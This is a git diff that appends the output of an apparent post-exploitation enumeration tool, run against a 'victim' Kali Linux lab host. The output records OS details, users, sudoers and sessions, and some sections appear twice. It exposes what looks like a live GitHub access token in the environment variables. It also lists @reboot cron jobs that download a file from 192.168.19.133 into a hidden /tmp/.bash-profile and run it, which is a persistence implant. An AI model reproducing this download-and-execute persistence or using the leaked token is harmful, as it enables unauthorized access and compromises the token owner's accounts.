@@ -305,3 +305,95 @@ Stored Variables:
 =========
 sudo version:
 Sudo version 1.8.27
+=========== About Victim OS ===========
+Kernel Version:
+PRETTY_NAME="Kali GNU/Linux Rolling"
+NAME="Kali GNU/Linux"
+VERSION="2022.4"
+VERSION_ID="2022.4"
+VERSION_CODENAME="kali-rolling"
+ID=kali
+ID_LIKE=debian
+HOME_URL="https://www.kali.org/"
+SUPPORT_URL="https://forums.kali.org/"
+BUG_REPORT_URL="https://bugs.kali.org/"
+ANSI_COLOR="1;31"
+=========
+Proc Version:
+Linux version 5.16.0-kali7-amd64 (devel@kali.org) (gcc-11 (Debian 11.2.0-19) 11.2.0, GNU ld (GNU Binutils for Debian) 2.38) #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
+=========
+Issue:
+Kali GNU/Linux Rolling \n \l
+
+=========
+Stored Variables:
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+COMMAND_NOT_FOUND_INSTALL_PROMPT=1
+POWERSHELL_UPDATECHECK=Off
+POWERSHELL_TELEMETRY_OPTOUT=1
+DOTNET_CLI_TELEMETRY_OPTOUT=1
+A="AbdelazizElhawary"
+B="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"
+=========
+sudo version:
+Sudo version 1.9.11p3
+=========== About Victim OS ===========
+Kernel Version:
+PRETTY_NAME="Kali GNU/Linux Rolling"
+NAME="Kali GNU/Linux"
+VERSION="2022.4"
+VERSION_ID="2022.4"
+VERSION_CODENAME="kali-rolling"
+ID=kali
+ID_LIKE=debian
+HOME_URL="https://www.kali.org/"
+SUPPORT_URL="https://forums.kali.org/"
+BUG_REPORT_URL="https://bugs.kali.org/"
+ANSI_COLOR="1;31"
+=========
+Proc Version:
+Linux version 5.16.0-kali7-amd64 (devel@kali.org) (gcc-11 (Debian 11.2.0-19) 11.2.0, GNU ld (GNU Binutils for Debian) 2.38) #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
+=========
+Issue:
+Kali GNU/Linux Rolling \n \l
+
+=========
+Stored Variables:
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+COMMAND_NOT_FOUND_INSTALL_PROMPT=1
+POWERSHELL_UPDATECHECK=Off
+POWERSHELL_TELEMETRY_OPTOUT=1
+DOTNET_CLI_TELEMETRY_OPTOUT=1
+A="AbdelazizElhawary"
+B="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"
+=========
+sudo version:
+Sudo version 1.9.11p3
+=========== Users info ===========
+Users with groups: 
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),133(scanner),141(kaboxer)
+uid=1001(test) gid=1001(test) groups=1001(test)
+uid=1002(best) gid=1002(best) groups=1002(best)
+uid=1003(hawary) gid=1003(hawary) groups=1003(hawary)
+uid=1004(kareem) gid=1004(kareem) groups=1004(kareem)
+uid=1005(tamer) gid=1005(tamer) groups=1005(tamer)
+uid=1006(salma) gid=1006(salma) groups=1006(salma)
+uid=1007(hamada) gid=1007(hamada) groups=1007(hamada)
+uid=1008(teeesaast) gid=1008(teeesaast) groups=1008(teeesaast)
+uid=1009(test123) gid=1009(test123) groups=1009(test123),100(users)
+===========
+All root accounts (uid 0)
+root
+===========
+Users Priviliages:
+root	ALL=(ALL:ALL) ALL
+===========
+Active Sudoers:
+ 17:16:47 up  5:35,  2 users,  load average: 3.21, 1.83, 1.14
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     tty7     :0               Fri17   47:37m 22:36  22:36  /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+kali     pts/2    -                15:24   18:23  56.48s  0.10s sudo su
+===========
+Cron Jobs held by all users:
+@reboot sleep 45 && wget --no-check-certificate https://192.168.19.133:8000/lin-download/eth0 -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile
+@reboot sleep 45 && wget --no-check-certificate https://192.168.19.133:8000/lin-download/eth0 -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile
